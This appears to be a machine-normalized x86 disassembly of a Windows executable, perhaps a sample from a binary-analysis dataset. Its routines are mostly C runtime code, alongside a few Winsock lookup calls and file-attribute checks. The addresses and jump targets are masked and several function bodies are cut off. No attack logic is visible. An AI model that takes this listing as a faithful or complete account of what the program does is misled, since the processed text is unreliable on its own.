push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push esi
call sub_405450
inc eax
push eax
call sub_4054cb
pop ecx
test eax eax
pop ecx
je r-xdata
push esi
push eax
call sub_405540
pop ecx
pop ecx
pop esi
retn
sub_40bf36
push [ esp + 0x4 ]
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
test al 0x1
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_409f85
pop ecx
xor eax eax
retn
test [ esp + 0x8 ] 0x2
je r-xdata
mov [ rw-data ] 0xd
mov [ rw-data ] 0x5
jmp r-xdata
or eax 0xffffffff
retn
sub_40bf7a
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40bfa7
mov eax [ ebp + 0xc ]
add esp 0x10
pop ebp
retn
sub_40bfa7
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
je r-xdata
mov esi [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
mov [ ecx ] 0x2d
inc ecx
neg esi
jmp r-xdata
add bl 0x30
add bl 0x57
jmp r-xdata
mov edi ecx
mov eax esi
xor edx edx
div [ ebp + 0x10 ]
mov eax esi
mov ebx edx
xor edx edx
div [ ebp + 0x10 ]
cmp ebx 0x9
mov esi eax
jbe r-xdata
and [ ecx ] 0x0
dec ecx
mov [ ecx ] bl
inc ecx
test esi esi
ja r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
mov [ edi ] al
dec ecx
inc edi
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40105e
mov eax r-xdata
retn
sub_401b50
sub esp 0x190
lea eax [ esp ]
push eax
push 0x2
call [ Ordinal_WSOCK32_115@IAT ]
neg eax
sbb eax eax
inc eax
add esp 0x190
retn
sub_402652
push rw-data
call sub_404c48
test eax eax
pop ecx
jne r-xdata
push rw-data
push rw-data
call sub_404ac9
pop ecx
pop ecx
retn
retn
sub_4026a7
push rw-data
push rw-data
call sub_404ac9
pop ecx
pop ecx
retn
sub_4026b9
push rw-data
call sub_404a0e
test eax eax
pop ecx
jne r-xdata
push rw-data
push rw-data
call sub_404ac9
pop ecx
pop ecx
retn
retn
sub_402b65
push [ esp + 0x4 ]
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ Ordinal_WSOCK32_11@IAT ]
retn
sub_4030e6
mov eax [ rw-data ]
lea ecx [ eax + 0x4 ]
push ecx
push [ eax ]
call sub_402d22
pop ecx
pop ecx
retn
sub_403308
mov eax sub_40330e
retn
sub_40330e
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_4033b0
mov eax sub_4033b6
retn
sub_4033b6
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_4034ec
mov eax sub_4034f2
retn
sub_4034f2
push 0x1
pop eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_403719
push [ rw-data ]
call sub_403bcb
neg eax
sbb al al
pop ecx
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_403a3c
sub_40401c
mov eax r-xdata
retn
sub_40508c
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_405093
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_4052b9
push 0x1
pop eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40535c
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_4053e6
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_40535c
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_405412
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_40542c
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_405b65
call sub_408761
test eax eax
jne r-xdata
push eax
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_4085f1
add esp 0x10
retn
retn
sub_405b85
push 0x40
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_405b65
add esp 0xc
retn
sub_405bc7
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_405bd1
mov eax [ rw-data ]
imul eax eax 0x343fd
add eax 0x269ec3
mov [ rw-data ] eax
sar eax 0x10
and eax 0x7fff
retn
sub_405d56
push [ esp + 0x4 ]
call sub_405ccb
pop ecx
retn
sub_40633c
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_406424
push rw-data
push rw-data
call sub_406424
add esp 0x10
retn
call eax
sub_406369
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_40638b
add esp 0xc
retn
sub_40637a
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_40638b
add esp 0xc
retn
sub_406559
cmp [ rw-data ] 0x1
jne r-xdata
push [ esp + 0x4 ]
call sub_4097b1
pop ecx
push 0xff
call [ ExitProcess@IAT ]
call sub_409778
sub_40692b
push [ ebp - 0x14 ]
call sub_406962
pop ecx
retn
sub_406962
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
jmp sub_406dcc
xor eax eax
retn
sub_406a8f
push [ ebp - 0x14 ]
call sub_406aff
pop ecx
retn
sub_406ce1
push 0x1
pop eax
retn
sub_406ce5
mov esp [ ebp - 0x18 ]
jmp sub_406dcc
sub_406d43
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_406d4c
mov esp [ ebp - 0x18 ]
jmp sub_406dcc
sub_406e09
push 0x1
pop eax
retn
sub_406e5f
push 0x1
pop eax
retn
sub_408302
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
retn
sub_40830f
mov eax [ esp + 0x4 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
retn
sub_40831f
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
retn
sub_4084a2
push 0x1
call sub_4084ab
pop ecx
retn
sub_40975d
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_40537e
add esp 0x8
pop ebp
retn 0x4
sub_40994a
push sub_409904
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] eax
retn
sub_40995b
push [ rw-data ]
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_409968
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_409984
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_4099a0
push esi
push 0x1
pop esi
push [ esp + 0x8 ]
call [ IsBadCodePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_409d50
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + eax * 8 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_409e1b
call sub_4084a2
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp sub_40b30d
sub_40a4bf
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40a4d4
inc [ rw-data ]
sub_40ab17
push 0x1
pop eax
retn
sub_40ab67
push 0x4
push 0x0
push [ esp + 0xc ]
call sub_40ab78
add esp 0xc
retn
sub_40af6d
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xfffffffd
call sub_40aba9
pop ecx
mov [ rw-data ] 0x1
sub_40b365
push 0x2
call sub_406534
pop ecx
retn
sub_40b641
push 0x1
pop eax
retn
sub_40b6f5
push 0x1
pop eax
retn
sub_40ba5a
push 0x1
pop eax
retn
sub_40bac9
push 0x1
pop eax
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_40c004
mov eax r--data
jmp sub_4050e9
sub_40c010
mov eax r--data
jmp sub_4050e9
sub_40c01c
mov eax r--data
jmp sub_4050e9
sub_40c028
mov eax r--data
jmp sub_4050e9
sub_40c034
mov eax r--data
jmp sub_4050e9
